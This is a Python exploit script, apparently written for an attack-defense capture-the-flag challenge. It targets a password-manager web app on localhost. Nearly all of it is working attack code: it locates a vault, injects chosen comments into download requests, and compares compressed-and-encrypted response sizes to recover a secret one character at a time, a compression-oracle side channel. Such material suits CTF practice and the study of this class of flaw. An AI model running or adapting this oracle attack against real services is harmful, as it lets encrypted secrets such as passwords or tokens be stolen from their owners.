#!/usr/bin/env python3
"""
Compression Oracle Exploit for FLAG_VAULT

Steps:
1. Go to browse-vault
2. Select FLAG_VAULT to download
3. Enter comment and download encrypted vault
4. Use compression oracle to bruteforce flag character by character

The attack works because when our comment starts with FLAG and matches
the actual flag content, gzip compression will be more effective,
resulting in smaller encrypted vault size.
"""

import requests
import string
import time
import sys
import os
import sys

sys.path.append(
    "/home/x3ero0/Research/ctf-academy/CTFs/attackdefense_1/challenges/password-manager"
)


class FlagVaultExploit:
    def __init__(self, base_url="http://localhost:3333"):
        self.base_url = base_url
        self.session = requests.Session()
        self.charset = string.printable

    def browse_vaults(self):
        response = self.session.get(f"{self.base_url}/browse-vaults")
        if response.status_code != 200:
            return None

        html = response.text

        import re

        # Look for table rows containing FLAG_VAULT and extract vault ID
        # Pattern: <td>1</td> followed by <td><strong>FLAG_VAULT</strong></td>
        vault_pattern = r"<td>(\d+)</td>\s*<td[^>]*>.*?FLAG_VAULT.*?</td>"
        vault_match = re.search(vault_pattern, html, re.DOTALL | re.IGNORECASE)

        if vault_match:
            vault_id = vault_match.group(1)
            return vault_id
        else:
            flag_pattern = r"/vault/(\d+).*?FLAG"
            flag_match = re.search(flag_pattern, html, re.DOTALL | re.IGNORECASE)
            if flag_match:
                vault_id = flag_match.group(1)
                return vault_id

        print("Available vaults in HTML:")
        vault_links = re.findall(r"/vault/(\d+)", html)
        for link in vault_links[:5]:  # Show first 5
            print(f"   Vault ID: {link}")

        return None

    def download_vault_with_comment(self, vault_id, comment):
        # First get the download page
        download_url = f"{self.base_url}/download/{vault_id}"
        response = self.session.get(download_url)
        if response.status_code != 200:
            return None

        # Now POST the download request with comment
        download_data = {"comment": comment}

        response = self.session.post(download_url, data=download_data)
        if response.status_code == 200:
            encrypted_bytes = response.content
            size = len(encrypted_bytes)
            return size

        else:
            if response.text:
                print(f"Response: {response.text[:200]}...")
            return None

    def get_baseline_size(self, vault_id):
        size = self.download_vault_with_comment(vault_id, "")
        return size


def main():
    exploit = FlagVaultExploit()
    try:
        print("Finding FLAG_VAULT...")
        flag_vault = exploit.browse_vaults()
        if not flag_vault:
            print("FLAG_VAULT not found!")
            return

        # Binary search approach for compression oracle
        candidate = "https://x3ero0.dev"
        charset = string.printable

        print(f"Starting bruteforce with known prefix: '{candidate}'")

        # Get baseline with known good prefix
        baseline_size = exploit.download_vault_with_comment(flag_vault, candidate)
        if baseline_size is None:
            print("Failed to get baseline size")
            return

        print(f"Baseline size for '{candidate}': {baseline_size} bytes")

        max_iterations = 50

        for iteration in range(max_iterations):
            print(f"\nIteration {iteration + 1}: Extending '{candidate}'")

            # Test current candidate
            current_size = exploit.download_vault_with_comment(flag_vault, candidate)
            if current_size is None:
                print("Failed to get current size")
                break

            print(f"Current size: {current_size} bytes")

            # Reset variables for next character search
            best_char = None
            best_size = current_size
            best_improvement = 0

            # Test all characters and compare against wrong attempts
            char_scores = []

            # Get wrong candidate size once for comparison
            wrong_candidate = candidate + "*"  # Use * as wrong character
            wrong_size = exploit.download_vault_with_comment(
                flag_vault, wrong_candidate
            )
            if wrong_size is None:
                print("Failed to get wrong candidate size")
                break

            # Track the best improvement found so far
            current_best_improvement = 0

            for ch in charset:
                correct_candidate = candidate + ch
                correct_size = exploit.download_vault_with_comment(
                    flag_vault, correct_candidate
                )

                if correct_size is not None:
                    # Compare correct vs wrong (smaller correct size is better)
                    improvement = wrong_size - correct_size
                    char_scores.append((ch, correct_size, wrong_size, improvement))
                    print(
                        f"  '{correct_candidate}' -> {correct_size} bytes vs '{wrong_candidate}' -> {wrong_size} bytes ({improvement:+d})"
                    )

                    # Track the best character found so far
                    if improvement > current_best_improvement:
                        current_best_improvement = improvement
                        best_char = ch
                        best_size = correct_size
                        best_improvement = improvement
                        print(
                            f"  New best character: '{ch}' with {improvement}+ bytes improvement"
                        )

                    # Only break early if we find a very significant improvement (>= 5 bytes)
                    # This reduces false positives while still optimizing speed
                    if improvement >= 5:
                        print(
                            f"Found very significant improvement ({improvement}+ bytes), breaking early"
                        )
                        break

            # If we didn't break early, find the best from all tested
            if best_char is None and char_scores:
                # Sort by improvement (biggest positive difference is best)
                char_scores.sort(key=lambda x: x[3], reverse=True)
                best_char, best_size, wrong_size, best_improvement = char_scores[0]
            elif not char_scores and best_char is None:
                print("No valid character results")
                break

            print(
                f"\nBest character: '{best_char}' -> {best_size} bytes (vs wrong: {wrong_size}, improvement: {best_improvement:+d})"
            )

            # Only add if there's improvement over wrong attempt
            if best_improvement > 0:
                candidate += best_char
                print(
                    f"New candidate: '{candidate}' (improvement: {best_improvement:+d})"
                )
                baseline_size = best_size
            else:
                print("No character shows improvement over wrong attempt")
                break

            # Stop after reasonable length
            if len(candidate) > 60:
                print("Reached maximum reasonable URL length")
                break

        print(f"\nFinal extracted URL: '{candidate}'")

    except KeyboardInterrupt:
        print("\nExploit interrupted by user")
    except Exception as e:
        print(f"\nExploit error: {e}")
        import traceback

        traceback.print_exc()


if __name__ == "__main__":
    main()
